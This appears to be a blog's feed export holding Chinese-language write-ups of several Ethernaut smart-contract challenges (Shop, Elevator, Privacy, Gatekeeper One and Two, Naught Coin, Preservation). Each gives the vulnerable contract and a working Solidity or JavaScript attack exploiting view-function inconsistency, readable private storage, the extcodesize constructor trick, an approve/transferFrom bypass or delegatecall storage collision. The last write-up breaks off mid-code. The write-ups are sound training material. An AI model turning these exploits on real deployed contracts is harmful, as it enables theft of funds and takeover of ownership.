    <id>http://cishoon.top/ethernaut/22-Shop/</id>
    <published>2024-12-23T16:00:00.000Z</published>
    <updated>2024-12-24T12:16:50.793Z</updated>
    
    <content type="html"><![CDATA[<p>花更少的前买东西。</p><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Buyer {</span><br><span class="line">    function price() external view returns (uint256);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">contract Shop {</span><br><span class="line">    uint256 public price = 100;</span><br><span class="line">    bool public isSold;</span><br><span class="line"></span><br><span class="line">    function buy() public {</span><br><span class="line">        Buyer _buyer = Buyer(msg.sender);</span><br><span class="line"></span><br><span class="line">        if (_buyer.price() &gt;= price &amp;&amp; !isSold) {</span><br><span class="line">            isSold = true;</span><br><span class="line">            price = _buyer.price();</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>这跟上次一样啊？第一次调用返回1000，第二次调用返回100；</p><p>噢，等等，这次设置了 price 是 view 函数，不能修改状态。</p><p>但是也有办法，我们可以看gas来判断是第一次还是第二次。</p><p>又想复杂了，shop的isSold是public 的……</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface IShop {</span><br><span class="line">    function isSold() external view returns (bool);</span><br><span class="line">    function buy() external;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">contract Buyer {</span><br><span class="line">    address levelInstance;</span><br><span class="line"></span><br><span class="line">    constructor(address _levelInstance) {</span><br><span class="line">        levelInstance = _levelInstance;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function price() public view returns (uint256) {</span><br><span class="line">        return IShop(msg.sender).isSold() ? 0 : 100;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function buy() public {</span><br><span class="line">        IShop(levelInstance).buy();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;花更少的前买东西。&lt;/p&gt;</summary>
    
    
    
    <category term="Ethernaut" scheme="http://cishoon.top/categories/Ethernaut/"/>
    
    
    <category term="以太坊" scheme="http://cishoon.top/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
    <category term="智能合约" scheme="http://cishoon.top/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
    <category term="Ethernaut" scheme="http://cishoon.top/tags/Ethernaut/"/>
    
  </entry>
  
  <entry>
    <title>Ethernaut - Elevator</title>
    <link href="http://cishoon.top/ethernaut/12-Elevator/"/>
    <id>http://cishoon.top/ethernaut/12-Elevator/</id>
    <published>2024-12-22T16:00:00.000Z</published>
    <updated>2024-12-23T06:50:58.751Z</updated>
    
    <content type="html"><![CDATA[<p>电梯不会让你达到最顶层。</p><ul><li>Sometimes solidity is not good at keeping promises.</li></ul><p>很神秘的一句话。</p><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Building {</span><br><span class="line">    function isLastFloor(uint256) external returns (bool);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">contract Elevator {</span><br><span class="line">    bool public top;</span><br><span class="line">    uint256 public floor;</span><br><span class="line"></span><br><span class="line">    function goTo(uint256 _floor) public {</span><br><span class="line">        Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">        if (!building.isLastFloor(_floor)) {</span><br><span class="line">            floor = _floor;</span><br><span class="line">            top = building.isLastFloor(floor);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>我自己得写一个合约，作为Building，提供一个isLastFloor函数。那我让他第一次调用返回false，第二次被调用返回true即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface IElevator {</span><br><span class="line">    function goTo(uint256 _floor) external;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">contract Building {</span><br><span class="line">    bool isFirst;</span><br><span class="line"></span><br><span class="line">    constructor() {</span><br><span class="line">        isFirst = true;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function isLastFloor(uint256 _floor) external returns (bool) {</span><br><span class="line">        if (isFirst) {</span><br><span class="line">            isFirst = false;</span><br><span class="line">            return false;</span><br><span class="line">        } else {</span><br><span class="line">            return true;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function goTo(uint256 _floor) public {</span><br><span class="line">        IElevator elevator = IElevator(0x295591a34Cfac609f4A6A7B5D8D5BdcAC8987dBF);</span><br><span class="line"></span><br><span class="line">        elevator.goTo(_floor);</span><br><span class="line">    } </span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>这关的启示是view和pure函数，他们不会修改合约的状态。</p><p>view只会读取状态，pure既不读取也不修改。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;电梯不会让你达到最顶层。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Sometimes solidity is not good at keeping promises.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;很神秘的一句话。&lt;/p&gt;</summary>
    
    
    
    <category term="Ethernaut" scheme="http://cishoon.top/categories/Ethernaut/"/>
    
    
    <category term="以太坊" scheme="http://cishoon.top/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
    <category term="智能合约" scheme="http://cishoon.top/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
    <category term="Ethernaut" scheme="http://cishoon.top/tags/Ethernaut/"/>
    
  </entry>
  
  <entry>
    <title>Ethernaut - Privacy</title>
    <link href="http://cishoon.top/ethernaut/13-Privacy/"/>
    <id>http://cishoon.top/ethernaut/13-Privacy/</id>
    <published>2024-12-22T16:00:00.000Z</published>
    <updated>2024-12-23T07:34:59.375Z</updated>
    
    <content type="html"><![CDATA[<p>解锁这个智能合约。</p><p>重点应该是之前看过的内存空间结构。</p><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Privacy {</span><br><span class="line">    bool public locked = true; // slot0</span><br><span class="line">    uint256 public ID = block.timestamp;// slot1</span><br><span class="line">    uint8 private flattening = 10; // slot2</span><br><span class="line">    uint8 private denomination = 255;// slot2</span><br><span class="line">    uint16 private awkwardness = uint16(block.timestamp); // slot2</span><br><span class="line">    bytes32[3] private data;  // slot3-5</span><br><span class="line"></span><br><span class="line">    constructor(bytes32[3] memory _data) {</span><br><span class="line">        data = _data;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function unlock(bytes16 _key) public {</span><br><span class="line">        require(_key == bytes16(data[2]));</span><br><span class="line">        locked = false;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">    A bunch of super advanced solidity algorithms...</span><br><span class="line"></span><br><span class="line">      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`</span><br><span class="line">      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,</span><br><span class="line">      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\</span><br><span class="line">      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)</span><br><span class="line">      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU</span><br><span class="line">    */</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>重点是，一个状态不会存到两个slot里，一个slot剩余区域如果能存下后一个状态，会把两个状态打包在一个slot里。</p><p>和Vault很像。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">const</span> { provider, wallet, contract } = <span class="title function_">getConfig</span>(<span class="variable constant_">CONTRACT_ADDRESS</span>);</span><br><span class="line">  <span class="keyword">let</span> res = <span class="keyword">await</span> provider.<span class="title function_">getStorage</span>(<span class="variable constant_">CONTRACT_ADDRESS</span>, <span class="number">5</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="title function_">slice</span>(<span class="number">0</span>, <span class="number">2</span> + <span class="number">32</span>));</span><br><span class="line">}</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;解锁这个智能合约。&lt;/p&gt;
&lt;p&gt;重点应该是之前看过的内存空间结构。&lt;/p&gt;</summary>
    
    
    
    <category term="Ethernaut" scheme="http://cishoon.top/categories/Ethernaut/"/>
    
    
    <category term="以太坊" scheme="http://cishoon.top/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
    <category term="智能合约" scheme="http://cishoon.top/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
    <category term="Ethernaut" scheme="http://cishoon.top/tags/Ethernaut/"/>
    
  </entry>
  
  <entry>
    <title>Ethernaut - Gatekeeper Two</title>
    <link href="http://cishoon.top/ethernaut/15-Gatekeeper-Two/"/>
    <id>http://cishoon.top/ethernaut/15-Gatekeeper-Two/</id>
    <published>2024-12-22T16:00:00.000Z</published>
    <updated>2024-12-23T14:14:41.160Z</updated>
    
    <content type="html"><![CDATA[<p>第二题，差不多，就是有个汇编代码关键字。</p><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assembly {</span><br><span class="line">    x := extcodesize(caller())</span><br><span class="line">}</span><br></pre></td></tr></table></figure><ul><li>extcodesize(address)是用于返回地址的字节码长度<ul><li>如果是合约，字节码长度非零</li><li>如果是账户，字节码长度为零</li></ul></li><li>caller() 就是 msg.sender；</li></ul><p>这就有点奇怪了啊？</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">modifier gateOne() {</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">modifier gateTwo() {</span><br><span class="line">    uint256 x;</span><br><span class="line">    assembly {</span><br><span class="line">        x := extcodesize(caller())</span><br><span class="line">    }</span><br><span class="line">    require(x == 0);</span><br><span class="line">    _;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">modifier gateThree(bytes8 _gateKey) {</span><br><span class="line">    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);</span><br><span class="line">    _;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>既要发送者是账户，又要经过合约转发？</p><p>绕过gateTwo的方法是，合约在创建阶段，字节码长度还是0；所以在构造函数里调用就可以了。</p><p>第三问一个简单的位运算。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack {</span><br><span class="line">    constructor(address _target) {</span><br><span class="line">        GatekeeperTwo gk = GatekeeperTwo(_target);</span><br><span class="line"></span><br><span class="line">        bytes8 key = bytes8(~uint64(bytes8(keccak256(abi.encodePacked(address(this))))));</span><br><span class="line">        gk.enter(key);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;第二题，差不多，就是有个汇编代码关键字。&lt;/p&gt;</summary>
    
    
    
    <category term="Ethernaut" scheme="http://cishoon.top/categories/Ethernaut/"/>
    
    
    <category term="以太坊" scheme="http://cishoon.top/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
    <category term="智能合约" scheme="http://cishoon.top/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
    <category term="Ethernaut" scheme="http://cishoon.top/tags/Ethernaut/"/>
    
  </entry>
  
  <entry>
    <title>Ethernaut - Naught Coin</title>
    <link href="http://cishoon.top/ethernaut/16-Naught-Coin/"/>
    <id>http://cishoon.top/ethernaut/16-Naught-Coin/</id>
    <published>2024-12-22T16:00:00.000Z</published>
    <updated>2024-12-23T15:12:11.816Z</updated>
    
    <content type="html"><![CDATA[<p>Naught Coin 是一个 ERC20 货币！</p><p>这一节考点就是 ERC20 的概念了。</p><span id="more"></span><h1 id="erc-20-代币接收问题">ERC-20 代币接收问题</h1><p>当 ERC-20 代币被发送到并非为处理 ERC-20代币而设计的智能合约时，这些代币可能会永久丢失。出现这种情况的原因是，接收合约无法识别或回应所传入的代币，而且 ERC-20标准中也没有通知接受合约所传入代币的机制。导致这一问题的主要原因包括：</p><ol type="1"><li>代币转移机制</li></ol><ul><li>ERC-20 代币使用 transfer 或 transferFrom 函数进行转移<ul><li>当用户使用这些函数将代币发送到合约地址时，无论接收合约是否是为处理它们而设计，代币都会被转移</li></ul></li></ul><ol type="1"><li>缺乏通知<ul><li>接收合约不会收到已向其发送代币的通知或回调</li><li>如果接收合约缺乏处理代币的机制（例如，回退函数或专门用于处理代币接收的函数），则代币实际上会卡在合约的地址中</li></ul></li><li>无内置处理<ul><li>ERC-20标准不包含用于接收待实现合约的强制函数，导致许多合约无法正确管理传入的代币</li></ul></li></ol><p>除了 ERC-20 ，这个题还有个转账限制，合约创建10年后才可以转账2333</p><p>那我现在等十年回来再做（不是）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {</span><br><span class="line">    super.transfer(_to, _value);</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>这里还是看一下父类的实现。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function transfer(address to, uint256 value) public virtual returns (bool) {</span><br><span class="line">    address owner = _msgSender();</span><br><span class="line">    _transfer(owner, to, value);</span><br><span class="line">    return true;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">function _transfer(address from, address to, uint256 value) internal {</span><br><span class="line">    if (from == address(0)) {</span><br><span class="line">        revert ERC20InvalidSender(address(0));</span><br><span class="line">    }</span><br><span class="line">    if (to == address(0)) {</span><br><span class="line">        revert ERC20InvalidReceiver(address(0));</span><br><span class="line">    }</span><br><span class="line">    _update(from, to, value);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">function _update(address from, address to, uint256 value) internal virtual {</span><br><span class="line">    if (from == address(0)) {</span><br><span class="line">        // Overflow check required: The rest of the code assumes that totalSupply never overflows</span><br><span class="line">        _totalSupply += value;</span><br><span class="line">    } else {</span><br><span class="line">        uint256 fromBalance = _balances[from];</span><br><span class="line">        if (fromBalance &lt; value) {</span><br><span class="line">            revert ERC20InsufficientBalance(from, fromBalance, value);</span><br><span class="line">        }</span><br><span class="line">        unchecked {</span><br><span class="line">            // Overflow not possible: value &lt;= fromBalance &lt;= totalSupply.</span><br><span class="line">            _balances[from] = fromBalance - value;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    if (to == address(0)) {</span><br><span class="line">        unchecked {</span><br><span class="line">            // Overflow not possible:</span><br><span class="line">            // value &lt;= totalSupply or value &lt;= fromBalance &lt;= totalSupply.</span><br><span class="line">            _totalSupply -= value;</span><br><span class="line">        }</span><br><span class="line">    } else {</span><br><span class="line">        unchecked {</span><br><span class="line">            // Overflow not possible: </span><br><span class="line">            // balance + value is at most totalSupply, which we know fits into a uint256.</span><br><span class="line">            _balances[to] += value;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    emit Transfer(from, to, value);</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>没看出啥漏洞啊？</p><p>看来player是绕不过检测的，但是其他合约是不走这个检测的。</p><p>我可以让其他合约给 address(0) 发送<code>1000000 * (10 ** uint256(decimals()))</code>个货币，整个合约就没钱了？不对，因为直接用 transfer 不能给 address(0)发。</p><p>是不是有其他的我可以调用的函数，绕过这个 transfer ？</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {</span><br><span class="line">    address spender = _msgSender();</span><br><span class="line">    _spendAllowance(from, spender, value);</span><br><span class="line">    _transfer(from, to, value);</span><br><span class="line">    return true;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">function _spendAllowance(address owner, address spender, uint256 value) internal virtual {</span><br><span class="line">    uint256 currentAllowance = allowance(owner, spender);</span><br><span class="line">    if (currentAllowance &lt; type(uint256).max) {</span><br><span class="line">        if (currentAllowance &lt; value) {</span><br><span class="line">            revert ERC20InsufficientAllowance(spender, currentAllowance, value);</span><br><span class="line">        }</span><br><span class="line">        unchecked {</span><br><span class="line">            _approve(owner, spender, currentAllowance - value, false);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {</span><br><span class="line">    if (owner == address(0)) {</span><br><span class="line">        revert ERC20InvalidApprover(address(0));</span><br><span class="line">    }</span><br><span class="line">    if (spender == address(0)) {</span><br><span class="line">        revert ERC20InvalidSpender(address(0));</span><br><span class="line">    }</span><br><span class="line">    _allowances[owner][spender] = value;</span><br><span class="line">    if (emitEvent) {</span><br><span class="line">        emit Approval(owner, spender, value);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>发现个新概念，<strong>授权和转移</strong></p><p><strong>授权和转移</strong>：transferFrom 是 ERC-20的授权机制的一部分。当用户调用 approve函数授权某个地址（比如一个智能合约）在一定额度内代为转移代币时，其他地址（通常是智能合约或第三方）可以通过调用transferFrom 来转移这些代币。</p><p>所以我可以给一个智能合约授权我的所有货币，然后让智能合约调用tranferFrom 帮我把钱花掉。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">approve</span>(<span class="string">"0x6Aeb10F5b34A3553f57eAd90D3e2B5D7f0F52bEd"</span>, <span class="number">1000000000000000000000000n</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Attack {</span><br><span class="line">    address public target;</span><br><span class="line">    constructor(address _target) {</span><br><span class="line">        target = _target;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function transferAll() external payable {</span><br><span class="line">        (bool success, bytes memory returnData) = address(target).call(</span><br><span class="line">            abi.encodeWithSignature("transferFrom(address,address,uint256)", address(msg.sender), address(this), 1000000 * (10 ** uint256(18)))</span><br><span class="line">        );</span><br><span class="line">        require(success, "Call failed");</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;Naught Coin 是一个 ERC20 货币！&lt;/p&gt;
&lt;p&gt;这一节考点就是 ERC20 的概念了。&lt;/p&gt;</summary>
    
    
    
    <category term="Ethernaut" scheme="http://cishoon.top/categories/Ethernaut/"/>
    
    
    <category term="以太坊" scheme="http://cishoon.top/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
    <category term="智能合约" scheme="http://cishoon.top/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
    <category term="Ethernaut" scheme="http://cishoon.top/tags/Ethernaut/"/>
    
  </entry>
  
  <entry>
    <title>Ethernaut - Preservation</title>
    <link href="http://cishoon.top/ethernaut/17-Preservation/"/>
    <id>http://cishoon.top/ethernaut/17-Preservation/</id>
    <published>2024-12-22T16:00:00.000Z</published>
    <updated>2024-12-23T16:02:14.002Z</updated>
    
    <content type="html"><![CDATA[<p>核心是里用 delegatecall 来进行攻击。</p><p>首先需要补充一下 abi 的各个函数的作用。</p><span id="more"></span><h1 id="abi模块">abi模块</h1><p>图片中列出的 <code>abi</code> 模块的方法是 Solidity 和 EVM编码中常用的方法，主要用于对数据的编码和解码。以下是它们的作用解释：</p><h3 id="abi.decode">1. <strong><code>abi.decode</code></strong></h3><ul><li><p><strong>作用</strong>: 用于解码通过 ABI 编码的字节数据。</p></li><li><p><strong>签名</strong>:<code>decode(bytes encodedData, (...)) returns (...)</code></p></li><li><p><strong>使用场景</strong>: 如果你从合约中获取了编码的字节数据（如<code>bytes</code> 类型），你可以用 <code>abi.decode</code>来还原它为原始的数据类型。</p></li><li><p>示例:</p><p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes memory data = abi.encode("Hello", 123);</span><br><span class="line">(string memory str, uint256 num) = abi.decode(data, (string, uint256));</span><br></pre></td></tr></table></figure></p></li></ul><hr><h3 id="abi.encode">2. <strong><code>abi.encode</code></strong></h3><ul><li><p><strong>作用</strong>: 对数据进行 ABI编码，返回一个字节数组。</p></li><li><p><strong>签名</strong>:<code>encode(...) returns (bytes)</code></p></li><li><p><strong>使用场景</strong>: 在 Solidity中生成适合合约交互的输入数据，或创建自定义的数据格式。</p></li><li><p>示例:</p><p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes memory data = abi.encode("Hello", 123);</span><br><span class="line">// data 包含两个参数编码后的字节数据</span><br></pre></td></tr></table></figure></p></li></ul><hr><h3 id="abi.encodecall">3.<strong><code>abi.encodeCall</code></strong></h3><ul><li><p><strong>作用</strong>:对函数调用进行编码，包含函数选择器和参数。</p></li><li><p><strong>签名</strong>:<code>encodeCall(function, (...)) returns (bytes)</code></p></li><li><p><strong>使用场景</strong>:用于准备合约方法调用的字节数据，适合低层次合约调用（如<code>call</code>）。</p></li><li><p>示例:</p><p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes memory data = abi.encodeCall(myContract.myFunction, (arg1, arg2));</span><br></pre></td></tr></table></figure></p></li></ul><hr><h3 id="abi.encodepacked">4.<strong><code>abi.encodePacked</code></strong></h3><ul><li><p><strong>作用</strong>: 进行紧凑编码，不包含 32字节对齐填充。</p></li><li><p><strong>签名</strong>:<code>encodePacked(...) returns (bytes)</code></p></li><li><p><strong>使用场景</strong>: 用于生成哈希（如<code>keccak256</code>）或减少存储占用，但需小心避免哈希碰撞。</p></li><li><p>示例:</p><p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes memory packed = abi.encodePacked("Hello", uint8(123));</span><br></pre></td></tr></table></figure></p></li></ul><hr><h3 id="abi.encodewithselector">5.<strong><code>abi.encodeWithSelector</code></strong></h3><ul><li><p><strong>作用</strong>:对函数选择器和参数进行编码，返回包含函数选择器的字节数据。</p></li><li><p><strong>签名</strong>:<code>encodeWithSelector(bytes4 selector, (...)) returns (bytes)</code></p></li><li><p><strong>使用场景</strong>:手动设置函数选择器并编码数据，用于合约交互。</p></li><li><p>示例:</p><p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes memory data = abi.encodeWithSelector(myContract.myFunction.selector, arg1, arg2);</span><br></pre></td></tr></table></figure></p></li></ul><hr><h3 id="abi.encodewithsignature">6.<strong><code>abi.encodeWithSignature</code></strong></h3><ul><li><p><strong>作用</strong>:根据函数签名和参数进行编码，返回包含函数选择器的字节数据。</p></li><li><p><strong>签名</strong>:<code>encodeWithSignature(string signature, (...)) returns (bytes)</code></p></li><li><p><strong>使用场景</strong>:当函数签名已知时，用于生成与目标合约交互所需的编码数据。</p></li><li><p>示例:</p><p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes memory data = abi.encodeWithSignature("myFunction(uint256,string)", 123, "Hello");</span><br></pre></td></tr></table></figure></p></li></ul><hr><h3 id="区别总结">区别总结：</h3><table><colgroup><col style="width: 28%"><col style="width: 46%"><col style="width: 25%"></colgroup><thead><tr><th><strong>函数</strong></th><th><strong>主要用途</strong></th><th><strong>是否包含函数选择器</strong></th></tr></thead><tbody><tr><td><code>abi.decode</code></td><td>解码数据</td><td>不适用</td></tr><tr><td><code>abi.encode</code></td><td>标准 ABI 编码</td><td>否</td></tr><tr><td><code>abi.encodeCall</code></td><td>函数调用编码（函数选择器 + 参数）</td><td>是</td></tr><tr><td><code>abi.encodePacked</code></td><td>紧凑编码（无 32 字节对齐）</td><td>否</td></tr><tr><td><code>abi.encodeWithSelector</code></td><td>自定义函数选择器编码（函数选择器 + 参数）</td><td>是</td></tr><tr><td><code>abi.encodeWithSignature</code></td><td>使用函数签名直接编码（函数选择器 + 参数）</td><td>是</td></tr></tbody></table><h1 id="delegatecall如何对应存储">delegatecall如何对应存储？</h1><p>delegatecall不是不会切换上下文嘛，就是如果调用的函数里设置了一个Storage，但是修改的是调用合约对应的Storage。我有个问题，比如目标函数里修改了storedTime这个Storage，调用函数怎么找到对应的Storage？</p><ul><li>Solidity 合约中的状态变量会映射到特定的存储槽（StorageSlots），这些存储槽是根据变量声明的顺序确定的。</li><li>当目标函数通过 delegatecall被调用时，所有的存储访问（读或写）都会指向调用合约的存储槽，而不是目标合约的存储槽。</li></ul><p>存储槽式通过偏移量来确定的。所以，delegatecall的目标合约，必须和调用合约的内存分布完全一致！</p><p>这个题的问题就找到了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack {</span><br><span class="line">    address public timeZone1Library;</span><br><span class="line">    address public timeZone2Library;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 storedTime;</span><br><span class="line"></span><br><span class="line">    function setTime(uint256 _time) public {</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>然后调用两次setFirstTime，第一次把timeZone1Library设置为攻击合约，第二次用攻击合约修改owner。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">setFirstTime</span>(<span class="title class_">AttackContract</span>.<span class="property">address</span>)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">setFirstTime</span>(<span class="title class_">AttackContract</span>.<span class="property">address</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;核心是里用 delegatecall 来进行攻击。&lt;/p&gt;
&lt;p&gt;首先需要补充一下 abi 的各个函数的作用。&lt;/p&gt;</summary>
    
    
    
    <category term="Ethernaut" scheme="http://cishoon.top/categories/Ethernaut/"/>
    
    
    <category term="以太坊" scheme="http://cishoon.top/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
    <category term="智能合约" scheme="http://cishoon.top/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
    <category term="Ethernaut" scheme="http://cishoon.top/tags/Ethernaut/"/>
    
  </entry>
  
  <entry>
    <title>Ethernaut - Gatekeeper One</title>
    <link href="http://cishoon.top/ethernaut/14-Gatekeeper-One/"/>
    <id>http://cishoon.top/ethernaut/14-Gatekeeper-One/</id>
    <published>2024-12-22T16:00:00.000Z</published>
    <updated>2024-12-23T13:54:43.812Z</updated>
    
    <content type="html"><![CDATA[<p>通过守门人，注册为参赛者，才能通过这一关。</p><p>复习 Telephone 和 Token。</p><p>也就是tx和msg的属性，以及数据下溢。</p><p>额外还有一个 <code>gasleft()</code>函数，可以返回剩余gas数量。</p><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne {</span><br><span class="line">    address public entrant;</span><br><span class="line"></span><br><span class="line">    modifier gateOne() {</span><br><span class="line">        require(msg.sender != tx.origin);</span><br><span class="line">        _;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    modifier gateTwo() {</span><br><span class="line">        require(gasleft() % 8191 == 0);</span><br><span class="line">        _;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    modifier gateThree(bytes8 _gateKey) {</span><br><span class="line">        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), </span><br><span class="line">        "GatekeeperOne: invalid gateThree part one");</span><br><span class="line">        require(uint32(uint64(_gateKey)) != uint64(_gateKey), </span><br><span class="line">        "GatekeeperOne: invalid gateThree part two");</span><br><span class="line">        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), </span><br><span class="line">        "GatekeeperOne: invalid gateThree part three");</span><br><span class="line">        _;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {</span><br><span class="line">        entrant = tx.origin;</span><br><span class="line">        return true;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>gateOne：转发请求即可；</p><p>gateTwo：要设置gasleft。可以设置调用合约的初始gas为8191。</p><p>gateThree：</p><ul><li><p>条件1：</p><p>这条条件要求 gateKey 转换成 uint64 后的低 32 位和低 16位相等。也就是说 gateKey 的高 16~31 位必须是 0。</p></li><li><p>条件2：</p><p>gateKey 的高 32 位必须是非零的。</p></li><li><p>条件3：</p><p>tx.origin的低16位就是_gateKey的低16位。</p></li></ul><p>所以我的就是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000000100007F7B</span><br></pre></td></tr></table></figure><p>这关重点是gas，可以在下图位置看到每个指令消耗的gas，发现执行完GAS消耗了256个gas。</p><figure><img src="/ethernaut/14-Gatekeeper-One/image-20241223170822785.png" alt="image-20241223170822785"><figcaption aria-hidden="true">image-20241223170822785</figcaption></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack 